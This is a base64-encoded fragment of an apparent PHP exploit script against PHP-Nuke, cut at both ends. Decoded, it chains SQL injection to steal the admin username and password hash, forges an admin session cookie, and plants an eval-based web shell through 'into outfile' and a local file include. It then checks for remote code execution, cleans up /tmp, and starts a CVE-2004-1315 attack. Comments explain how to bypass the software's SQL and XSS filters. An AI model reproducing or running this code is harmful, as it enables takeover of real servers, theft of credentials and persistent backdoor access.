gIHByaW50KCJVc2VhZ2U6IC4vcGhwX2V4cGxvaXQgLXQgaHR0cDovL2xvY2FsaG9zdFxuIik7DQogICAgICBkaWUoIkEgdXNlcidzIGNvb2tpZSBpcyByZXF1aXJlZCBmb3IgOC4xLjM1IDogLi9waHBfZXhwbG9pdCAtdCBodHRwOi8vbG9jYWxob3N0IC1jIHVzZXI9TWpwaFpHMXBiam8xWmpSa1kyTXpZalZoWVRjMk5XUTJNV1E0TXpJM1pHVmlPRGd5WTJZNU9Ub3hNRG82TURvd09qQTZNRG82TkRBNU5nPT1cbiIpOw0KICAgfQ0KICAgJGF0dGFja191cmw9c3RyX3JlcGxhY2UoImluZGV4LnBocCIsIiIsJGF0dGFja191cmwpOw0KICAgJGh0dHA9bmV3IGh0dHBfY2xpZW50KCk7DQogICAkc2V4PW5ldyBwaHBfbnVrZV9ibGluZF9zcWxfaW5qZWN0aW9uKCRhdHRhY2tfdXJsLiIvIik7DQogICBpZighJGFkbWluX2Nvb2tpZSl7DQoJICAvL1RoaXMgaXMgd2hhdCBhIGNvb2tpZSBsb29rcyBsaWtlOg0KCSAgLy8yOnVzZXJfbmFtZToyMTIzMmYyOTdhNTdhNWE3NDM4OTRhMGU0YTgwMWZjMzoxMDo6MDowOjA6MDpEZWVwQmx1ZTo0MDk2DQoJICAvLyR1c2VyX2Nvb2tpZT0idXNlcj1NanBoWkcxcGJqb3lNVEl6TW1ZeU9UZGhOVGRoTldFM05ETTRPVFJoTUdVMFlUZ3dNV1pqTXpveE1EbzZNRG93T2pBNk1EcEVaV1Z3UW14MVpUbzBNRGsyIjsNCgkgIGlmKCR1c2VyX2Nvb2tpZSl7DQogICAgICAgIHByaW50ICJVc2luZyBjb29raWUuLi5cbiI7DQogICAgICAgICRodHRwLT5jb29raWU9JHVzZXJfY29va2llOw0KICAgICAgICAvLzEzMzcrMzAwMDAgaXMgdXNlZCBhcyBhIHBpdm90IGluIHBhcnNpbmcsICBhbmQgdG8gdGVzdCBmb3IgYSBzdWNlc3NmdWwgaW5qZWN0aW9uLg0KICAgICAgICAvL1RoaXMgaXMgTk9UIEJsaW5kIFNRTCBJbmplY3Rpb24sICB3ZSB3aWxsIGJlIHJlYWRpbmcgdGhlIHJlc3VsdC4gIFRoaXMgYXR0YWNrIHdvcmtzIHdpdGggbWFnaWNfcXVvdGVzX2dwYyBvbiBvciBvZmYuDQogICAgICAgICRodHRwLT5wb3N0ZGF0YT0idGl0bGU9d293XFwmYm9keXRleHQ9LyombW9vZD0iLnVybGVuY29kZSgiJyovLDAsMCwxMzM3KzMwMDAwLChzZWxlY3QgYWlkIGZyb20gbnVrZV9hdXRob3JzIGxpbWl0IDEpLDAsKHNlbGVjdCBwd2QgZnJvbSBudWtlX2F1dGhvcnMgbGltaXQgMSksMTMzNyszMDAwMCktLSAxIikuIiZzdGF0dXM9bm8mc3VibWl0PUFkZCtOZXcrRW50cnkiOw0KICAgICAgICAkcmVzcG9uc2U9JGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9tb2R1bGVzLnBocD9uYW1lPUpvdXJuYWwmZmlsZT1zYXZlbmV3Iik7DQogICAgICAgIC8vVGhpcyBwYXJ0IG9mIHRoZSBleHBsb2l0IGlzIGEgYml0IHN0cmFuZ2Ugc29ycnkgZm9yIHRoZSBtZXNzLCAgZ290dGEgcmVhbGVhc2UhDQogICAgICAgIGlmKHN0cnN0cigkcmVzcG9uc2UsImphdmFzY3JpcHQ6aGlzdG9yeS5nbygtMSkiKSl7DQogICAgICAgICAgICAvL21hZ2ljX3F1b3Rlc19ncGM9b24NCiAgICAgICAgICAgICRodHRwLT5wb3N0ZGF0YT0idGl0bGU9d293Jmpib2R5dGV4dD10ZXh0Jm1vb2Q9Ii51cmxlbmNvZGUoIicsMTMzNyszMDAwMCwoc2VsZWN0IGFpZCBmcm9tIG51a2VfYXV0aG9ycyBsaW1pdCAxKSwwLChzZWxlY3QgcHdkIGZyb20gbnVrZV9hdXRob3JzIGxpbWl0IDEpLDEzMzcrMzAwMDApLS0gMSIpLiImc3RhdHVzPW5vJnN1Ym1pdD1BZGQrTmV3K0VudHJ5IjsNCiAgICAgICAgICAgICRyZXNwb25zZT0kaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL21vZHVsZXMucGhwP25hbWU9Sm91cm5hbCZmaWxlPXNhdmVuZXciKTsNCiAgICAgICAgICAgICRodHRwLT5wb3N0ZGF0YT0nJzsNCiAgICAgICAgICAgIC8vRmluZCB0aGUgcHJpbWFyeSBrZXkgb2YgdGhlIGpvdXJuYWwgZW50cnkgd2UganVzdCBjcmVhdGVkLg0KICAgICAgICAgICAgJGppZD0kaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL21vZHVsZXMucGhwP25hbWU9Sm91cm5hbCZmaWxlPWVkaXQiKTsNCiAgICAgICAgICAgIC8vd2Ugc2hvdWxkIGhhdmUgdGhlIHNpbmdsZSBxdW90ZSB0aGF0IHdlIGVzY2FwZWQgYXQgdGhlIGVuZCBvZiB3b3cnDQogICAgICAgICAgICAkamlkPWV4cGxvZGUoIlwiPndvdzwiLCRqaWQpOw0KICAgICAgICAgICAgJGppZD1leHBsb2RlKCJqaWQ9IiwgJGppZFswXSk7DQogICAgICAgICAgICAvL0NoZWNrIHRoZSBqb3VybmFsIGZvciB0aGUgYWRtaW4ncyB1c2VybmFtZS9wYXNzd29yZCBoYXNoDQogICAgICAgICAgICAkcmVzcG9uc2U9JGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9tb2R1bGVzLnBocD9uYW1lPUpvdXJuYWwmZmlsZT1kaXNwbGF5JmppZD0iLiRqaWRbMV0pOw0KICAgICAgICAgICAgaWYoc3RycG9zKCRyZXNwb25zZSwiMzEzMzciKSl7DQogICAgICAgICAgICAgICBsaXN0KCRqdW5rLCRhaWQsJHB3ZCk9ZXhwbG9kZSgiMzEzMzcgQCAiLCRyZXNwb25zZSk7DQogICAgICAgICAgICAgICAkYWlkPWV4cGxvZGUoIjwiLCRhaWQpOw0KICAgICAgICAgICAgICAgJHB3ZD1leHBsb2RlKCI8IiwkcHdkKTsNCiAgICAgICAgICAgICAgICR1c2VyX25hbWU9JGFpZFswXTsNCiAgICAgICAgICAgICAgICRwYXNzX2hhc2g9JHB3ZFswXTsNCiAgICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICAgLy9tYWdpY19xdW90ZXNfZ3BjPW9mZg0KICAgICAgICAgICAgICAgc2xlZXAoMyk7DQogICAgICAgICAgICAgICAkaHR0cC0+cG9zdGRhdGE9InRpdGxlPXdvd1xcJmpib2R5dGV4dD0vKiZtb29kPTEmc3RhdHVzPSIudXJsZW5jb2RlKCJubycsKHNlbGVjdCBhaWQgZnJvbSBudWtlX2F1dGhvcnMgbGltaXQgMSksKHNlbGVjdCBwd2QgZnJvbSBudWtlX2F1dGhvcnMgbGltaXQgMSkpLS0gMSIpLiImc3VibWl0PUFkZCtOZXcrRW50cnkiOw0KICAgICAgICAgICAgICAgJHJlc3BvbnNlPSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Kb3VybmFsJmZpbGU9c2F2ZW5ldyIpOw0KICAgICAgICAgICAgICAgc2xlZXAoMik7DQogICAgICAgICAgICAgICAkamlkPSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Kb3VybmFsJmZpbGU9ZWRpdCIpOw0KICAgICAgICAgICAgICAgJGppZD1leHBsb2RlKCJcIj53b3c8IiwkamlkKTsNCiAgICAgICAgICAgICAgICRqaWQ9ZXhwbG9kZSgiamlkPSIsICRqaWRbMF0pOw0KICAgICAgICAgICAgICAgJGppZD1leHBsb2RlKCJcIj4iLCRqaWRbMV0pOw0KICAgICAgICAgICAgICAgLy9DaGVjayB0aGUgam91cm5hbCBmb3IgdGhlIGFkbWluJ3MgdXNlcm5hbWUvcGFzc3dvcmQgaGFzaA0KICAgICAgICAgICAgICAgJHJlc3BvbnNlPSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Kb3VybmFsJmZpbGU9ZGlzcGxheSZqaWQ9Ii4kamlkWzBdKTsNCiAgICAgICAgICAgICAgICRpbmo9ZXhwbG9kZSgiTGFzdCB1cGRhdGVkIG9uICIsJHJlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICRpbmo9ZXhwbG9kZSgiIEAgIiwkaW5qWzFdKTsNCiAgICAgICAgICAgICAgICRwYXNzX2hhc2g9JGlualswXTsNCiAgICAgICAgICAgICAgICRpbmo9ZXhwbG9kZSgiPCIsJGlualsxXSk7DQogICAgICAgICAgICAgICAkdXNlcl9uYW1lPSRpbmpbMF07DQogICAgICAgICAgICB9DQogICAgICAgIH1lbHNlew0KICAgICAgICAgICAgJGh0dHAtPnBvc3RkYXRhPScnOw0KICAgICAgICAgICAgLy9GaW5kIHRoZSBwcmltYXJ5IGtleSBvZiB0aGUgam91cm5hbCBlbnRyeSB3ZSBqdXN0IGNyZWF0ZWQuDQogICAgICAgICAgICAkamlkPSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Kb3VybmFsJmZpbGU9ZWRpdCIpOw0KICAgICAgICAgICAgLy93ZSBzaG91bGQgaGF2ZSB0aGUgc2luZ2xlIHF1b3RlIHRoYXQgd2UgZXNjYXBlZCBhdCB0aGUgZW5kIG9mIHdvdycNCiAgICAgICAgICAgICRqaWQ9ZXhwbG9kZSgiXCI+d293Jyw8IiwkamlkKTsNCiAgICAgICAgICAgICRqaWQ9ZXhwbG9kZSgiamlkPSIsICRqaWRbMF0pOw0KICAgICAgICAgICAgLy9DaGVjayB0aGUgam91cm5hbCBmb3IgdGhlIGFkbWluJ3MgdXNlcm5hbWUvcGFzc3dvcmQgaGFzaA0KICAgICAgICAgICAgJHJlc3BvbnNlPSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Kb3VybmFsJmZpbGU9ZGlzcGxheSZqaWQ9Ii4kamlkWzFdKTsNCiAgICAgICAgICAgIGlmKCFzdHJwb3MoJHJlc3BvbnNlLCIzMTMzNyIpKXsNCiAgICAgICAgICAgICAgIGRpZSgidGFyZ2V0IGhhcyBwYXRjaGVkIVxuIik7DQogICAgICAgICAgICB9ZWxzZXsNCiAgICAgICAgICAgICAgIHByaW50ICJUYXJnZXQgdnVsbmVyYWJsZSB0byBhIHByaXZpbGVnZSBlc2NhbGF0aW9uIGF0dGFjayEhIVxuIjsNCiAgICAgICAgICAgICAgIGxpc3QoJGp1bmssJGFpZCwkcHdkKT1leHBsb2RlKCIzMTMzNyBAICIsJHJlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICRhaWQ9ZXhwbG9kZSgiPCIsJGFpZCk7DQogICAgICAgICAgICAgICAkcHdkPWV4cGxvZGUoIjwiLCRwd2QpOw0KICAgICAgICAgICAgICAgJHVzZXJfbmFtZT0kYWlkWzBdOw0KICAgICAgICAgICAgICAgJHBhc3NfaGFzaD0kcHdkWzBdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgfQ0KCSAgIH1lbHNlew0KICAgICAgICAgJHNleC0+c2xlZXA9InNsZWVwKDUpIjsNCiAgICAgICAgIHByaW50ICJTdGFydGluZyBBdHRhY2sgQWdhaW5zdDoiLiRhdHRhY2tfdXJsLiIvXG4iOw0KICAgICAgICAgcHJpbnQgIlRlc3RpbmcgZm9yIGJsaW5kIHNxbCBpbmplY3Rpb24uLi5cbiI7DQogICAgICAgICBpZighJHNleC0+dGVzdF90YXJnZXQoKSl7DQogICAgICAgICAgICAgcHJpbnQoIlRhcmdldCBtaWdodCBiZSBydW5uaW5nIDguMS4zNVxuIik7DQogICAgICAgICAgICAgcHJpbnQoIlRyeSB0aGUgcHJpdmlsZWdlIGVzY2lhdGlvbiBhdHRhY2sgdG8gdXBsb2FkIHRoZSBzaGVsbDoiKTsNCiAgICAgICAgICAgICBkaWUoIi4vcGhwX2V4cGxvaXQgLXQgaHR0cDovL2xvY2FsaG9zdCAtYyB1c2VyPU1qcGhaRzFwYmpvMVpqUmtZMk16WWpWaFlUYzJOV1EyTVdRNE16STNaR1ZpT0RneVkyWTVPVG94TURvNk1Eb3dPakE2TURvNk5EQTVOZz09XG4iKTsNCiAgICAgICAgIH0NCiAgICAgICAgIHByaW50ICJUYXJnZXQgaXMgdnVsbmVyYWJsZSB0byBibGluZCBzcWwgaW5qZWN0aW9uISEhXG4iOw0KICAgICAgICAgcHJpbnQgIlBsZWFzZSBTdGFuZGJ5IEZvciBBdHRhY2suLi5cbiI7DQogICAgICAgICAkcGFzc19oYXNoPSRzZXgtPmZpbmRfbWQ1KCJwd2QiKTsNCiAgICAgICAgICR1c2VyX25hbWU9JHNleC0+ZmluZF9zdHJpbmcoImFpZCIpOw0KICAgICAgICAgcHJpbnQgImF0dGFja2VkIHVzZWQ6Ii4kc2V4LT5yZXF1ZXN0X2NvdW50LiIgcmVxdWVzdHMuXG4iOw0KCSAgICB9DQoJICAgIHByaW50ICJGb3VuZCBBZG1pbidzIG5hbWU6Ii4kdXNlcl9uYW1lLiJcbiI7DQoJICAgIHByaW50ICJGb3VuZCBNRDUgUGFzc3dvcmQgaGFzaDoiLiRwYXNzX2hhc2guIlxuIjsNCgkgICAgJGFkbWluX2Nvb2tpZT0iYWRtaW49Ii5iYXNlNjRfZW5jb2RlKCR1c2VyX25hbWUuIjoiLiRwYXNzX2hhc2guIjoiKS4iOyI7DQogICAgfQ0KICAgIHByaW50ICJVc2luZyBBZG1pbiBTZXNzaW9uIElEOlxuIi4kYWRtaW5fY29va2llLiJcbiI7DQogICAgJGh0dHAtPmNvb2tpZT0kYWRtaW5fY29va2llOw0KICAgIC8vaXBiYW4ucGhwDQogICAgc2xlZXAoMyk7DQogICAgLy9UaGlzIHJlcXVlc3Qgd2lsbCB0ZWxsIHVzIHdoYXQgdmVyc2lvbiBvZiBwaHAtbnVrZSBpdCBpcy4NCiAgICAvL0lmIGl0IGlzIDgsIFRoZW4gdGhlIHBhZ2UgZ2l2ZXMgdXMgY29uZmlndXJhdGlvbiBpbmZvcm1hdGlvbiB0byBwZXJzZXJ2ZS4NCiAgICAkYWRtaW5fb3B0aW9ucz0kaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL2FkbWluLnBocD9vcD1nZW5lcmFsIik7DQogICAgaWYoIXN0cnN0cigkYWRtaW5fb3B0aW9ucywiQ29udGVudC1MZW5ndGg6IDAiKSl7DQogICAgICAgIHByaW50ICJQSFAtTnVrZSA4IGRldGVjdGVkLlxuIjsNCiAgICAgICAgJG9wdGlvbl92YWx1ZXM9ZXhwbG9kZSgidmFsdWU9JyIsJGFkbWluX29wdGlvbnMpOw0KICAgICAgICAkeD0wOw0KICAgICAgICBhcnJheV9zaGlmdCgkb3B0aW9uX3ZhbHVlcyk7DQogICAgICAgIC8vUGFyc2luZyBvdXQgYW5kIHN0b3JpbmcgY29uZmlndXJhdGlvbiB2YWx1ZXMgdG8gcmVzdG9yZSB0aGVtIGFmdGVyIHRoZSBoYWNrLiANCiAgICAgICAgZm9yZWFjaCggJG9wdGlvbl92YWx1ZXMgYXMgJHZhbHVlKXsNCiAgICAgICAgICAgICR2YWx1ZT1leHBsb2RlKCInIiwkdmFsdWUpOw0KICAgICAgICAgICAgJHZhbHVlc1tdPXVybGVuY29kZSgkdmFsdWVbMF0pOw0KICAgICAgICAgICAgaWYoJHgrKz09NCkNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICAvL2lwYmFuLnBocA0KICAgICAgICBzbGVlcCgyKTsNCiAgICAgICAgLy9FbmFibGUgZXJyb3IgcmVwb3J0aW5nDQogICAgICAgICRodHRwLT5wb3N0ZGF0YT0ieHNpdGVuYW1lPSIuJHZhbHVlc1swXS4iJnhudWtldXJsPSIuJHZhbHVlc1sxXS4iJnhzbG9nYW49Ii4kdmFsdWVzWzJdLiImeHN0YXJ0ZGF0ZT0iLiR2YWx1ZXNbM10uIiZ4YWRtaW5ncmFwaGljPSIuJHZhbHVlc1s0XS4iJnhnZnhfY2hrPTAmeG51a2VfZWRpdG9yPTEmeGRpc3BsYXlfZXJyb3JzPTEmb3A9c2F2ZWdlbmVyYWwiOw0KICAgICAgICAkZXJyb3JfcmVwb3J0aW5nPSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvYWRtaW4ucGhwIik7DQogICAgICAgIC8vUGF0aCBkaWNsb3N1cmUgaW4gYWRkX3B3ZC4gIFdlIHdpbGwgdHJpZ2dlciBhIHdhcm5pbmcgYnkgcGFzc2luZyBtZDUoKSB0aGUgYXJyYXkgYWRkX3B3ZFtdLg0KICAgICAgICAkaHR0cC0+cG9zdGRhdGE9ImFkZF9uYW1lPWp1bmsmYWRkX2FpZD1qdW5rJmFkZF9lbWFpbD1qdW5rJmFkZF91cmw9anVuayZhZGRfYWRtbGFuZ3VhZ2U9JmF1dGhfbW9kdWxlcyU1QiU1RD0yMyZhZGRfcmFkbWluc3VwZXI9MSZhZGRfcHdkW109anVuayZvcD1BZGRBdXRob3IiOw0KICAgICAgICAkcmVtb3RlX3BhdGg9JGh0dHAtPmdldFBhdGgoJGF0dGFja191cmwuIi9hZG1pbi5waHAiLDMpOw0KICAgICAgICBzbGVlcCgyKTsNCiAgICAgICAgaWYoc3Ryc3RyKCRyZW1vdGVfcGF0aCwnOlxcJykpew0KICAgICAgICAgICAgcHJpbnQgIldpbmRvd3MgYm94IGRldGVjdGVkLlxuIjsNCiAgICAgICAgICAgIHByaW50ICJSZW1vdGUgcGF0aDokcmVtb3RlX3BhdGhcbiI7DQogICAgICAgICAgICBwcmludCAiVXBsb2FkaW5nIGJhY2tkb29yLi4uXG4iOw0KICAgICAgICAgICAgJHJlbW90ZV9wYXRoPWFkZHNsYXNoZXMoYWRkc2xhc2hlcygkcmVtb3RlX3BhdGguIlxcZnJvbnRlbmQucGhwIikpOw0KICAgICAgICAgICAgJGJhY2tkb29yPSdnZXRfbWFnaWNfcXVvdGVzX2dwYygpP2V2YWwoc3RyaXBzbGFzaGVzKCRfR0VUWyJlIl0pKTpldmFsKCRfR0VUWyJlIl0pJzsNCiAgICAgICAgICAgIC8vQ291bGQgaGF2ZSB1c2VkIGEgY29uY2F0IGJ1dCBwaHAtbnVrZSBmaWx0ZXJzIGZvciBpdC4gIFRoaXMgaGlkZXMgPD4gZnJvbSB0aGUgeHNzIGZpbHRlci4NCiAgICAgICAgICAgIC8vdW5pb24vKiovIGJ5cGFzc2VzIHRoZSBzcWwgaW5qZWN0aW9uIGZpbHRlciBvbiBsaW5lIDQxNCBpbiAuL21haW5maWxlLnBocA0KICAgICAgICAgICAgJGh0dHAtPnBvc3RkYXRhPSJjaG5nX3VpZD0iLnVybGVuY29kZSgiJyB1bmlvbi8qKi8gc2VsZWN0ICIuJHNleC0+Y2hhckVuY29kZSgiPD9waHAiKS4iLCciLiRiYWNrZG9vci4iJywiLiRzZXgtPmNoYXJFbmNvZGUoIj8+IikuIiwnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJyBpbnRvIG91dGZpbGUgJyIuJHJlbW90ZV9wYXRoLiInLS0gMSIpOw0KICAgICAgICAgICAgJHJlPSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvYWRtaW4ucGhwP29wPW1vZGlmeVVzZXIiKTsNCiAgICAgICAgICAgIC8vRGlzYWJsZSBlcnJvciByZXBvcnRpbmcNCiAgICAgICAgICAgICRodHRwLT5wb3N0ZGF0YT0ieHNpdGVuYW1lPSIuJHZhbHVlc1swXS4iJnhudWtldXJsPSIuJHZhbHVlc1sxXS4iJnhzbG9nYW49Ii4kdmFsdWVzWzJdLiImeHN0YXJ0ZGF0ZT0iLiR2YWx1ZXNbM10uIiZ4YWRtaW5ncmFwaGljPSIuJHZhbHVlc1s0XS4iJnhnZnhfY2hrPTAmeG51a2VfZWRpdG9yPTEmeGRpc3BsYXlfZXJyb3JzPTAmb3A9c2F2ZWdlbmVyYWwiOw0KICAgICAgICAgICAgJGVycm9yX3JlcG9ydGluZz0kaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL2FkbWluLnBocCIpOw0KICAgICAgICB9ZWxzZXsNCiAgICAgICAgICAgIHByaW50ICIqbml4IGJveCBkZXRlY3RlZC5cbiI7DQogICAgICAgICAgICBwcmludCAiUmVtb3RlIHBhdGg6JHJlbW90ZV9wYXRoXG4iOw0KICAgICAgICAgICAgLy9JcyBteXNxbCBvbiB0aGUgc2FtZSBtYWNoaW5lIGFzIHRoZSBodHRwZD8NCiAgICAgICAgICAgIHNsZWVwKDIpOw0KICAgICAgICAgICAgJGh0dHAtPnBvc3RkYXRhPSJjaG5nX3VpZD0iLnVybGVuY29kZSgiJyBvciAxPShzZWxlY3QgaWYoc3Vic3RyaW5nKGxvYWRfZmlsZSgnIi4kcmVtb3RlX3BhdGguIi9pbmRleC5waHAnKSwxLDEpPSc8JywwLDEpKS0tIDEiKTsNCiAgICAgICAgICAgICRteXNxbF9jaGVjaz0kaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL2FkbWluLnBocD9vcD1tb2RpZnlVc2VyIik7DQogICAgICAgICAgICBpZihzdHJzdHIoJG15c3FsX2NoZWNrLCJVc2VyIERvZXNuJ3QgRXhpc3RzISIpKXsNCiAgICAgICAgICAgICAgICBwcmludCgiTXlTUUwgaXNuJ3Qgb24gdGhlIHNhbWUgbWFjaGluZSBvciB5b3UgZG8gbm90IGhhdmUgZmlsZSBwcml2aWxlZ2VzLlxuIik7DQogICAgICAgICAgICAgICAgZGllKCJSZW1vdGUgY29kZSBleGVjdXRpb24gZmFpbGVkXG4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHByaW50ICJVcGxvYWRpbmcgYmFja2Rvb3IuLi5cbiI7DQogICAgICAgICAgICAvL2lwYmFuLnBocA0KICAgICAgICAgICAgc2xlZXAoMik7DQogICAgICAgICAgICAvL0dyYWIgdGhlIHRoZW1lLCAgdGhpcyBpcyBuZWVkZWQgdG8gcmVwYWlyIHRoZSBkYXRhYmFzZSBhZnRlciB0aGUgTEZJDQogICAgICAgICAgICAkdGhlbWU9JGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9hZG1pbi5waHA/b3A9dGhlbWVzIik7DQogICAgICAgICAgICAkdGhlbWU9ZXhwbG9kZSgnc3JjPSJ0aGVtZXMvJywkdGhlbWUpOw0KICAgICAgICAgICAgJHRoZW1lPWV4cGxvZGUoJy9pbWFnZXMvJywkdGhlbWVbMV0pOw0KICAgICAgICAgICAgLy9SZXBhaXIgdGhlIGRhdGFiYXNlIGFmdGVyIHRoZSBMRkkuDQogICAgICAgICAgICAkYmFja2Rvb3JfaW5zdGFsbGVyPSdmdW5jdGlvbiBPcGVuVGFibGUoKXt9IGZ1bmN0aW9uIHRoZW1laGVhZGVyKCl7fSAkZGItPnNxbF9xdWVyeSgidXBkYXRlICIuJHByZWZpeC4iX2NvbmZpZyBzZXQgRGVmYXVsdF9UaGVtZT0nLiRzZXgtPmNoYXJFbmNvZGUoJHRoZW1lWzBdKS4nLCBkaXNwbGF5X2Vycm9ycz0wIik7JzsNCiAgICAgICAgICAgIC8vVGhpcyBpcyBhIG1hZ2ljX3F1b3Rlc19ncGMgYW5kIG15c3FsIHNhZmUgYmFja2Rvb3IgdGhhdCBmaXRzIG9uIG9uZSBsaW5lLg0KICAgICAgICAgICAgJGJhY2tkb29yPSdnZXRfbWFnaWNfcXVvdGVzX2dwYygpP2V2YWwoc3RyaXBzbGFzaGVzKCIuY2hyKDM2KS4iX0dFVFsiLmNocigzNCkuImUiLmNocigzNCkuIl0pKTpldmFsKCIuY2hyKDM2KS4iX0dFVFsiLmNocigzNCkuImUiLmNocigzNCkuIl0pJzsNCiAgICAgICAgICAgIC8vSW5zdGFsbCB0aGUgYmFja2Rvb3IgaW4gYSByZWxpdGl2ZSBkaXJlY3RvcnkuDQogICAgICAgICAgICAkYmFja2Rvb3JfaW5zdGFsbGVyLj0nZmlsZV9wdXRfY29udGVudHMoJF9TRVJWRVJbIkRPQ1VNRU5UX1JPT1QiXS5kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfTkFNRSJdKS4iL2Zyb250ZW5kLnBocCIsY2hyKDYwKS4iP3BocCAnLiRiYWNrZG9vci4nPyIuY2hyKDYyKSk7JzsNCiAgICAgICAgICAgIC8vY2hhckVuY29kZSBpcyB1c2VkIHRvIGJ5cGFzcyBYU1MgZmlsdGVycy4NCgkgICAgICAgICAvL3VuaW9uLyoqLyBieXBhc3NlcyB0aGUgc3FsIGluamVjdGlvbiBmaWx0ZXIgb24gbGluZSA0MTQgaW4gLi9tYWluZmlsZS5waHANCiAgICAgICAgICAgICRodHRwLT5wb3N0ZGF0YT0iY2huZ191aWQ9Ii51cmxlbmNvZGUoIicgdW5pb24vKiovIHNlbGVjdCAiLiRzZXgtPmNoYXJFbmNvZGUoIjw/cGhwIikuIiwnIi4kYmFja2Rvb3JfaW5zdGFsbGVyLiInLCIuJHNleC0+Y2hhckVuY29kZSgiPz4iKS4iLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnIGludG8gb3V0ZmlsZSAnL3RtcC90aGVtZS5waHAnLS0gMSIpOw0KICAgICAgICAgICAgJGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9hZG1pbi5waHA/b3A9bW9kaWZ5VXNlciIpOw0KICAgICAgICAgICAgc2xlZXAoMik7DQogICAgICAgICAgICAvL2xvY2FsIGZpbGUgaW5jbHVkZSB2dWxuZXJhYmxpdHkgdG8gZXhlY3V0ZSAvdG1wL3RoZW1lLnBocA0KICAgICAgICAgICAgJGh0dHAtPnBvc3RkYXRhPSJ4RGVmYXVsdF9UaGVtZT0uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi90bXAmeG92ZXJ3cml0ZV90aGVtZT0wJm9wPXNhdmV0aGVtZXMiOw0KICAgICAgICAgICAgJGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9hZG1pbi5waHAiKTsNCiAgICAgICAgICAgIHNsZWVwKDIpOw0KICAgICAgICAgICAgJGh0dHAtPnBvc3RkYXRhPScnOw0KICAgICAgICAgICAgLy9GaXJlIG9mZiBhIGdldCByZXF1ZXN0IHRvIHRyaWdnZXIgdGhlIHVwbG9hZGVkIHBocCBmaWxlIHVzaW5nIExGSQ0KICAgICAgICAgICAgJGh0dHAtPnNlbmQoJGF0dGFja191cmwpOw0KICAgICAgICAgICAgc2xlZXAoMik7DQogICAgICAgICAgICAvL1RyeSB0aGUgTEZJIGFnYWluLCBqdXN0IGluIGNhc2UuDQogICAgICAgICAgICAkaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL2FkbWluLnBocCIpOw0KICAgICAgICB9DQogICAgICAgIHNsZWVwKDIpOw0KICAgICAgICAvL3Rlc3QgaWYgdGhlIGJhY2tkb29yIHdvcmtzLCAgdHJ5IGFuZCBjbGVhbiB1cCBhZnRlciB0aGUgZXhwbG9pdC4NCiAgICAgICAgJHRlc3RfYmFja2Rvb3I9JGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9mcm9udGVuZC5waHA/ZT0iLnVybGVuY29kZSgiZWNobyAzMTMzNzt1bmxpbmsoJy90bXAvdGhlbWUucGhwJyk7c3lzdGVtKCdybSAvdG1wL3RoZW1lLnBocCcpOyIpKTsNCiAgICAgICAgaWYoc3Ryc3RyKCR0ZXN0X2JhY2tkb29yLCIzMTMzNyIpKXsNCiAgICAgICAgICAgIHByaW50ICJSZW1vdGUgQ29kZSBleGVjdXRpb24gdGVzdGVkIHN1Y2Nlc3NmdWxseTpcbiIuJGF0dGFja191cmwuIi9mcm9udGVuZC5waHA/ZT1waHBpbmZvKCkiLnVybGVuY29kZSgnOycpLiJcbiI7DQogICAgICAgIH1lbHNlew0KICAgICAgICAgICAgcHJpbnQgIkJhY2tkb29yIGluc3RhbGwgZmFpbGVkIVxuIjsNCiAgICAgICAgfQ0KICAgIH1lbHNlew0KICAgICAgICAvLy8vUEhQLU51a2UgNy4wIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiBFeHBsb2l0IHVzaW5nIENWRS0yMDA0LTEzMTUgd2hpY2ggYWZmZWN0cyB0aGUgcGhwQkIgMi4wLjYgbW9kdWxlLg0KICAgICAgICBwcmludCAiUEhQLU51a2UgNyBkZXRlY3RlZC5cbiI7DQogICAgICAgICRodHRwLT5wb3N0ZGF0YT0iIjsvL3NlbmQgZ2V0IHJlcXVlc3RzLg0KICAgICAgICAvL0ZpcmUgb2ZmIGEgY2hlY2sgZm9yIENWRS0yMDA0LTEzMTUsICBwaHBiYiBtYXliZSBpbnN0YWxsZWQuIA0KICAgICAgICAvL1RoaXMgaXMgbW9yZSBsaWtlIHRoZSBvcmluZ2FsIENWRS0yMDA0LTEzMTU6ICUyNTI3LnByaW50ZigyMDA0MTMxNSkuJTI1MjcNCiAgICAgICAgLy9waHAtbnVrZSB3YXMgbm90IHZ1bG5lcmFibGUgdG8gdGhpcyBiZWNhdXNlIG9mIG1haW5maWxlIGxpbmUgNTA6IFwoW14+XSoiP1teKV0qXCkNCiAgICAgICAgLy90byBieWFwc3MgdGhpcyBjaGVjayBkb3VibGUgdXJsZW5jb2RlIHRoZSBwYXJyZW4gKCkgJTI1MjcucHJpbnRmJTI1MjgyMDA0MTMxNSUyNTI5LiUyNTI3DQogICAgICAgICR0cnlfZXhwbG9pdD